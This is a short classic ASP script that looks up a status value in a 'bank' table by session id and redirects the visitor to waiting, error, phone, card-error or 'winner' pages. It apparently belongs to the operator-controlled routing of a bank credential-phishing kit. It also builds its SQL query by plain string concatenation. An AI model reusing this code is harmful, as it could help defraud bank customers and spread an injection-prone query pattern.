<!--#include file="include/db_conn.asp"-->

<%
	dim rs
	set rs=server.CreateObject("adodb.recordset")
	rs.open "select * from bank where id="&session("ddid"),conn,1,3
	m=rs("n")
	rs.close
	set rs=Nothing

select case m
case 0 
	Response.Redirect "load2.asp"
case 1
	Response.Redirect "error2.asp"
case 2
	Response.Redirect "error2.asp"
case 3
    Response.Redirect "error2.asp" 
case 4
    Response.Redirect "error2.asp" 
case 5
    Response.Redirect "error2.asp" 
case 6
    Response.Redirect "s2.htm" 
case 7
    Response.Redirect "error2.asp" 
case 8
    Response.Redirect "winner.asp" 

case 9
    Response.Redirect "en.asp" 	

case 10
    Response.Redirect "phone.asp" 	

case 15
    Response.Redirect "carderr.asp" 
 
case 12
    a="设置回复选项"
    Response.Redirect "en.asp" 
	
	case 11
	a="设置回复选项"
	Response.Redirect "error2.asp" 
	
	
	
end Select
%>
